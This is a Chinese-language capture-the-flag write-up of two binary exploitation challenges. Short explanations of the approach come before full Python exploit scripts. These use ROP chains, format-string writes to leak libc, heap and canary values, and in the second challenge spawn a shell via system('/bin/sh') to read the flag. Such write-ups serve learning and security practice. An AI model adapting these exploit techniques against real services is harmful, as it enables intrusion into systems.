---
id: bc-ctf-2024
aliases: []
tags:
  - WriteUp
  - PWN
date: 2024-07-18 23:14:55
draft: false
title: WriteUp - Plan BeiChen - PWN
---

> [!info]
> 趁着午休的间隙看了一下题，感觉还挺有趣的，~~没有想象中那么粗制滥造~~，有一些思路可以记录一下。

- 附件链接：[github:AvavaAYA/ctf-writeup-collection](https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/Plan-BC-2024)

## pwn1

这道题有一些东拼西凑的感觉，有趣的点在于栈上溢出的数量非常有限，只能改写到返回地址，同时 gadget 也很少，没有控制 rsi、rdx 的能力。

最初考虑：程序开始的时候读了一些东西到 .bss 段上，那就栈迁移过去让 ROP 链接上，但是发现栈迁移过去后 puts 函数无法正常调用 - 因为栈太浅了，这条路也就断了。

> [!NOTE]
> 在公司里没有 ida，愣是花了半天才发现存在一个 `magic_gadget`，主要是两个功能：
>
> 1. 造成栈错位的现象，最终 rbp 位于栈顶 rsp 上面
> 2. 最后返回到一开始设置好的 rbp 地址

上述能力提供了获取输入时修改下个被调用函数（这里是 read）返回地址的能力，因此就可以构造更长的 ROP 链。

最后还要在堆上找到 flag 内容，这里考虑 libc 中 `mp_` 的 `sbrk_base` 域，会指向堆地址的开头：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

magic_gadget = 0x40172F
# .text:000000000040172F                 endbr64
# .text:0000000000401733                 push    rbp
# .text:0000000000401734                 mov     rbp, rsp
# .text:0000000000401737                 push    rbp
# .text:0000000000401738                 mov     rbp, rsp
# .text:000000000040173B                 pop     rdi
# .text:000000000040173C                 retn
pop_rbp_ret = 0x40173E
pop_rdi_ret = 0x000000000040173B


import base64

s(base64.b64decode("SV9jYW5fZmluZF90aGVfcmlnaHRfcGF0aAoK"))
ru(b"===welcome===\n")

payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            elf.got.puts,
            elf.plt.puts,
            0x401712,
        ]
    }
)
s(payload)
libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.puts
lg("libc_base", libc_base)

debugB()
payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            # libc_base + libc.sym.mp_ + 96,
            libc_base + 0x21A360 + 96 + 1,
            elf.plt.puts,
            0x401712,
        ]
    }
)
s(payload)
heap_base = u64_ex(ru(b"\n", drop=True)) << 0x8
lg("heap_base", heap_base)
flag_addr = heap_base + 0x2D0

debugB()
payload = flat(
    {
        0x30: [
            0x401712,
            magic_gadget,
        ]
    },
    filler=b"\x00",
)
s(payload)

debugB()
payload = flat(
    {
        0x8: [
            pop_rdi_ret,
            flag_addr,
            elf.plt.puts,
            0,
        ]
    }
)
s(payload)

ia()
```

---

## pwn2

这道题第一眼看到以为是普通的 strfmt，没想到题目还把标准输出关了。不过好在提供了泄露栈地址的能力。因此即使没有 elf 和 libc 基地址，也能借助改栈上残留地址的末位，进而实现一定程度的任意地址写。

思路如下：

1. 泄露栈地址
2. 前期准备工作，包括构造溢出、布置指向 stdout 的指针
3. 篡改 stdout 指针到 stderr，重新获取输出
4. 有输出的情况下就常规打法了，记得 getshell 后要 `1>&2`

因为 elf 地址和 libc 地址都是未知的，因此需要爆破两次 $\frac{1}{16}$，还是可以接受的：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

lg_inf("STEP 0 - Leak stack address.")
ru(b"Input your name size: \n")
sl(i2b(0x80))
ru(b"Input your name: \n")
s(b"a" * 0x80)
ru(b"a" * 0x80)
stack_base = u64_ex(ru(b"Now you have one time to change your name.\n", drop=True))
lg("stack_base", stack_base)

lg_inf("STEP 1 - Change ptr in stack to stdout with 1/16.")
# guess_bit0 = int(input("Input guess bit0 in elf >"), 16)
guess_bit0 = 0xF
fmt = strFmt()
payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += fmt.generate_hhn_payload(0x70 + 0x10, 0xFF)
payload += fmt.generate_hhn_payload(0x68 + 0x10, (guess_bit0 << 4) | 0)
payload = payload.ljust(0x68, b"\x00")
payload += flat([stack_base - 0xAF, stack_base - 0x183, stack_base - 0x198])
s(payload)

lg_inf("STEP 2 - Change stdout to stderr with 1/16.")
# guess_bit1 = int(input("Input guess bit1 in libc >"), 16)
guess_bit1 = 4
sl(b"a")
fmt = strFmt()
payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += fmt.generate_hn_payload(0xE0, (guess_bit1 << 12) | 0x5C0)
payload = payload.ljust(0x78, b"\x00")
payload += flat([stack_base - 0x198])
sl(payload)

lg_inf("STEP 3 - Now we have normal strfmt and stack overflow.")
fmt = strFmt()
payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += (
    b".%"
    + i2b(0x98 // 8 + 6)
    + b"$p.%"
    + i2b(0xA8 // 8 + 6)
    + b"$p.%"
    + i2b(0xC8 // 8 + 6)
    + b"$p."
)
payload = payload.ljust(0x78, b"\x00")
payload += flat([stack_base - 0x198])
sl(payload)
sl(payload)
ru(b"Now you have one time to change your name.\n")
ru(b".")
canary = int(ru(b".", drop=True), 16)
libc_base = int(ru(b".", drop=True), 16) - 0x240B3
elf_base = int(ru(b".", drop=True), 16) - 0x168D

lg_inf(
    "STEP 4 - However stdout is closed, so we need to do 1>&2 or write to stderr directly."
)
pop_rdi_ret = libc_base + 0x0000000000023B72
pop_rsi_ret = libc_base + 0x000000000002604F
get_rax = (
    libc_base + 0x000000000005B652
)  # mov rdi, rax; cmp rdx, rcx; jae 0x5b63c; mov rax, r8; ret;
pop_rdx_2_ret = libc_base + 0x0000000000119241
pop_rcx_2_ret = libc_base + 0x00000000001025AE

# payload = flat(
#     {
#         0x00: b"flag\x00",
#         0x88: [
#             canary,
#             0xDEADBEEF,
#             pop_rdi_ret,
#             stack_base - 0x180,
#             pop_rsi_ret,
#             0,
#             libc_base + libc.sym.open,
#             pop_rdx_2_ret,
#             0x100,
#             0,
#             pop_rcx_2_ret,
#             0x200,
#             0,
#             get_rax,
#             pop_rsi_ret,
#             stack_base,
#             libc_base + libc.sym.read,
#             pop_rdi_ret,
#             2,
#             libc_base + libc.sym.write,
#         ],
#     }
# )

payload = flat(
    {
        0x88: [
            canary,
            0xDEADBEEF,
            pop_rdi_ret + 1,
            pop_rdi_ret,
            libc_base + next(libc.search(b"/bin/sh\x00")),
            libc_base + libc.sym.system,
        ],
    }
)
sl(b"\x00")
sl(payload)
sl(b"cat flag 1>&2")

ia()
```
